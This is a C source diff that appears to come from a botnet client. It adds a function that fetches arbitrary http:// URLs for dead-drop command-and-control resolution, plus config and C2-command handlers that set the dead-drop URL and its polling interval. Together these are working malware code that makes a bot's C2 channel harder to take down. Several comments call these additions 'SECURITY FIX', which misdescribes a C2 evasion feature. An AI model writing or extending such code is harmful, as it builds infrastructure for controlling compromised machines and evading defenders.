@@ -752,6 +752,100 @@ int http_get(notnet_bot_t *bot, char *buf, int len) {
     return total;
 }
 
+/* Dead-drop / arbitrary-URL fetch (#86). GET a plaintext http:// URL into
+ * buf (bounded to len bytes total incl. headers) with a 10s timeout, and
+ * return the total bytes received — the full response (status line, headers,
+ * body); the caller locates the "\r\n\r\n" terminator to get at the body.
+ * Unlike http_get(), this does not require an existing C2 connection and can
+ * target any host, which is what dead-drop resolution needs. Cleartext only —
+ * the default build has no TLS — so callers must NOT treat the transport as a
+ * trust boundary; verification must happen on the payload (see deaddrop.c). */
+int http_get_url(notnet_bot_t *bot, const char *url, char *buf, int len) {
+    if (!url || url[0] == '\0' || strncmp(url, "http://", 7) != 0) {
+        log_warn("HTTP: http_get_url requires an http:// URL");
+        return -1;
+    }
+    char host[256];
+    uint16_t port = 80;
+    char path[512];
+    const char *p = url + 7;
+    const char *slash = strchr(p, '/');
+    size_t alen = slash ? (size_t)(slash - p) : strlen(p);
+    if (alen == 0 || alen >= sizeof(host)) {
+        log_warn("HTTP: http_get_url malformed URL: %s", url);
+        return -1;
+    }
+    memcpy(host, p, alen);
+    host[alen] = '\0';
+    char *colon = strrchr(host, ':');
+    if (colon) {
+        *colon = '\0';
+        int pv = atoi(colon + 1);
+        if (pv >= 1 && pv <= 65535) port = (uint16_t)pv;
+    }
+    if (slash) snprintf(path, sizeof(path), "%s", slash);
+    else snprintf(path, sizeof(path), "/");
+
+    int sock = tcp_connect_sock(bot, host, port);
+    if (sock < 0) {
+        log_warn("HTTP: http_get_url connect to %s:%u failed: %s", host, port, strerror(errno));
+        return -1;
+    }
+
+    char req[1024];
+    int reqlen = snprintf(req, sizeof(req),
+        "GET %s HTTP/1.1\r\n"
+        "Host: %s\r\n"
+        "User-Agent: %s\r\n"
+        "Connection: close\r\n"
+        "\r\n",
+        path, host, bot->c2_http.user_agent);
+    int sent = send(sock, req, reqlen, 0);
+    if (sent < 0 || sent != reqlen) {
+        log_warn("HTTP: http_get_url send failed: %s", strerror(errno));
+        close(sock);
+        return -1;
+    }
+
+    int total = 0;
+    while (total < len - 1) {
+        fd_set read_fds;
+        struct timeval tv;
+        FD_ZERO(&read_fds);
+        FD_SET(sock, &read_fds);
+        tv.tv_sec = 10;
+        tv.tv_usec = 0;
+
+        int sel = select(sock + 1, &read_fds, NULL, NULL, &tv);
+        if (sel <= 0) break;  /* timeout, EOF, or error */
+
+        int received = recv(sock, buf + total, len - total - 1, 0);
+        if (received <= 0) break;
+        total += received;
+    }
+    buf[total] = '\0';
+    close(sock);
+
+    if (total <= 0) {
+        log_warn("HTTP: http_get_url empty response from %s", url);
+        return -1;
+    }
+
+    /* Reject non-2xx responses (404/500 HTML error pages must not be parsed
+     * as a dead-drop blob). */
+    char *sp = strstr(buf, " ");
+    if (sp && sp[1] >= '0' && sp[1] <= '9' &&
+        sp[2] >= '0' && sp[2] <= '9' &&
+        sp[3] >= '0' && sp[3] <= '9') {
+        int code = (sp[1] - '0') * 100 + (sp[2] - '0') * 10 + (sp[3] - '0');
+        if (code < 200 || code >= 300) {
+            log_warn("HTTP: http_get_url %s returned HTTP %d", url, code);
+            return -1;
+        }
+    }
+    return total;
+}
+
 int http_read(notnet_bot_t *bot, char *buf, int len) {
     if (!bot->c2_http.connected) return -1;
     
@@ -2367,6 +2461,19 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     bot->flux_ttl = (uint32_t)v;
                     applied = 1;
                 }
+            } else if (strcmp(key, "dead_drop_url") == 0) {
+                /* SECURITY FIX (#86): dead-drop C2 endpoint. */
+                strncpy(bot->dead_drop_url, value, sizeof(bot->dead_drop_url) - 1);
+                bot->dead_drop_url[sizeof(bot->dead_drop_url) - 1] = '\0';
+                applied = 1;
+            } else if (strcmp(key, "dead_drop_interval") == 0) {
+                /* SECURITY FIX (#86): clamp like flux_ttl — a 0 would hammer
+                 * the drop every loop. */
+                int v = atoi(value);
+                if (v >= 30 && v <= 86400) {
+                    bot->dead_drop_interval = (uint32_t)v;
+                    applied = 1;
+                }
             }
             
             if (applied) {
@@ -3157,6 +3264,20 @@ int load_config(notnet_bot_t *bot, const char *path) {
             } else {
                 log_warn("Config: flux_ttl=%d out of range (1-3600), keeping %u",
                          v, bot->flux_ttl);
+            }
+        } else if (strcmp(key, "dead_drop_url") == 0) {
+            /* SECURITY FIX (#86): dead-drop C2 resolution endpoint. */
+            strncpy(bot->dead_drop_url, value, sizeof(bot->dead_drop_url) - 1);
+            bot->dead_drop_url[sizeof(bot->dead_drop_url) - 1] = '\0';
+        } else if (strcmp(key, "dead_drop_interval") == 0) {
+            /* SECURITY FIX (#86): clamp the re-resolution interval. A 0
+             * would hammer the drop every loop. Accept 30..86400s. */
+            int v = atoi(value);
+            if (v >= 30 && v <= 86400) {
+                bot->dead_drop_interval = (uint32_t)v;
+            } else {
+                log_warn("Config: dead_drop_interval=%d out of range (30-86400), keeping %u",
+                         v, bot->dead_drop_interval);
             }
         }
     }
